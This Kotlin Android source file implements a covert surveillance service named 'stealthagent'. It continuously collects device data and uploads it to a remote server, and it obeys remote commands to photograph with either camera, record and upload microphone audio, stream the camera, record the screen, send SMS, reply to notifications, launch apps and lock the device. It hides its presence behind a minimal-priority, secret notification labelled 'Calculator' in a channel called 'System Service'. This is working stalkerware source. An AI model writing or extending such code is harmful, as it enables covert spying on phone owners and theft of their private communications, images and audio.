package com.stealthagent.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.stealthagent.collector.AllCollectors
import com.stealthagent.data.AgentRepository
import com.stealthagent.model.CommandRequest
import com.stealthagent.network.AgentClient
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject

@AndroidEntryPoint
class AgentForegroundService : LifecycleService() {

    companion object {
        private const val CHANNEL_ID = "agent_bg"
        private const val NOTIFICATION_ID = 9010
        private const val NORMAL_INTERVAL = 60_000L
        private const val LOW_BATTERY_INTERVAL = 180_000L
        private const val UPLOAD_INTERVAL = 120_000L

        var isRunning = false; private set

        fun start(context: Context) {
            context.startForegroundService(Intent(context, AgentForegroundService::class.java))
        }
        fun stop(context: Context) {
            context.stopService(Intent(context, AgentForegroundService::class.java))
        }
    }

    @Inject lateinit var repository: AgentRepository
    @Inject lateinit var collectors: AllCollectors
    @Inject lateinit var client: AgentClient
    @Inject lateinit var cameraService: AgentCameraService
    @Inject lateinit var liveCameraService: AgentLiveCameraService
    @Inject lateinit var screenRecordService: AgentScreenRecordService

    private var collectJob: Job? = null
    private var uploadJob: Job? = null
    private var commandJob: Job? = null
    private var audioRecorder: MediaRecorder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        runCatching {
            createChannel()
            startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        }.onFailure {
            stopForeground(STOP_FOREGROUND_REMOVE); stopSelf(); return START_NOT_STICKY
        }
        isRunning = true
        startCollectLoop()
        startUploadLoop()
        startCommandLoop()
        return START_STICKY
    }

    private fun startCollectLoop() {
        collectJob?.cancel()
        collectJob = lifecycleScope.launch {
            while (isActive) {
                runCatching { collectors.collectAll() }
                delay(getInterval())
            }
        }
    }

    private fun startUploadLoop() {
        uploadJob?.cancel()
        uploadJob = lifecycleScope.launch {
            while (isActive) {
                delay(UPLOAD_INTERVAL)
                runCatching {
                    val unsent = repository.getUnsent()
                    if (unsent.isNotEmpty() && repository.isPaired) {
                        if (client.uploadBatch(unsent)) {
                            repository.markUploaded(unsent.map { it.id })
                            repository.setLastSync(System.currentTimeMillis())
                        }
                    }
                    repository.pruneOldEvents()
                }
            }
        }
    }

    private fun startCommandLoop() {
        commandJob?.cancel()
        commandJob = lifecycleScope.launch {
            while (isActive) {
                if (repository.isPaired) {
                    runCatching {
                        client.listenForCommands { cmd -> handleCommand(cmd) }
                    }
                }
                delay(5_000)
            }
        }
    }

    private fun handleCommand(cmd: CommandRequest) {
        lifecycleScope.launch {
            when (cmd.type) {
                "capture_front"       -> cameraService.capturePhoto(useFrontCamera = true)
                "capture_back"        -> cameraService.capturePhoto(useFrontCamera = false)
                "record_audio"        -> {
                    val secs = cmd.params["duration"]?.toIntOrNull() ?: 30
                    recordAudio(secs)
                }
                "ring"                -> ringDevice()
                "send_sms"            -> {
                    val to   = cmd.params["to"]   ?: return@launch
                    val body = cmd.params["body"] ?: return@launch
                    sendSms(to, body)
                }
                "stream_camera_front" -> liveCameraService.startStreaming(useFrontCamera = true)
                "stream_camera_back"  -> liveCameraService.startStreaming(useFrontCamera = false)
                "stop_camera_stream"  -> liveCameraService.stopStreaming()
                "screen_record"       -> {
                    val ms = cmd.params["duration"]?.toLongOrNull() ?: 30_000L
                    screenRecordService.recordScreen(ms.coerceIn(5_000, 120_000))
                }
                "reply_notification"  -> {
                    val pkg  = cmd.params["package"] ?: return@launch
                    val text = cmd.params["text"]    ?: return@launch
                    AgentNotificationListener.instance?.replyToNotification(pkg, text)
                }
                "launch_app"          -> {
                    val pkg = cmd.params["package"] ?: return@launch
                    launchApp(pkg)
                }
                "lock_device"         -> lockDevice()
                "wipe_vault"          -> {
                    repository.wipe()
                    stopSelf()
                }
            }
        }
    }

    private fun lockDevice() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
        if (dpm?.activeAdmins?.isNotEmpty() == true) runCatching { dpm.lockNow() }
    }

    private fun ringDevice() {
        runCatching {
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            val ringtone = RingtoneManager.getRingtone(applicationContext, uri)
            ringtone?.play()
            lifecycleScope.launch { delay(10_000); ringtone?.stop() }
        }
    }

    private suspend fun recordAudio(durationSeconds: Int) {
        val capped = durationSeconds.coerceIn(5, 300)
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(cacheDir, "remote_audio_$ts.m4a")

        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this)
                       else @Suppress("DEPRECATION") MediaRecorder()

        runCatching {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(128_000)
            recorder.setAudioSamplingRate(44_100)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            audioRecorder = recorder
            delay(capped * 1000L)
            recorder.stop()
            recorder.release()
            audioRecorder = null

            val bytes = file.readBytes()
            client.uploadFile(
                fileBytes = bytes,
                fileName = file.name,
                mimeType = "audio/mp4",
                category = "remote_audio",
            )
        }.onFailure {
            runCatching { recorder.release() }
            audioRecorder = null
        }
        file.delete()
    }

    private fun sendSms(to: String, body: String) {
        runCatching {
            @Suppress("DEPRECATION")
            android.telephony.SmsManager.getDefault().sendTextMessage(to, null, body, null, null)
        }
    }

    private fun launchApp(packageName: String) {
        runCatching {
            val intent = packageManager.getLaunchIntentForPackage(packageName) ?: return
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
    }

    private fun getInterval(): Long {
        val bi = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = bi?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = bi?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        val pct = if (scale > 0) (level * 100) / scale else 100
        return if (pct <= 20) LOW_BATTERY_INTERVAL else NORMAL_INTERVAL
    }

    override fun onDestroy() {
        isRunning = false
        collectJob?.cancel()
        uploadJob?.cancel()
        commandJob?.cancel()
        runCatching { audioRecorder?.release() }
        liveCameraService.stopStreaming()
        cameraService.release()
        screenRecordService.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? { super.onBind(intent); return null }

    private fun createChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN).apply {
            setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentTitle("Calculator").setContentText("Running")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET).setOngoing(true).build()
}
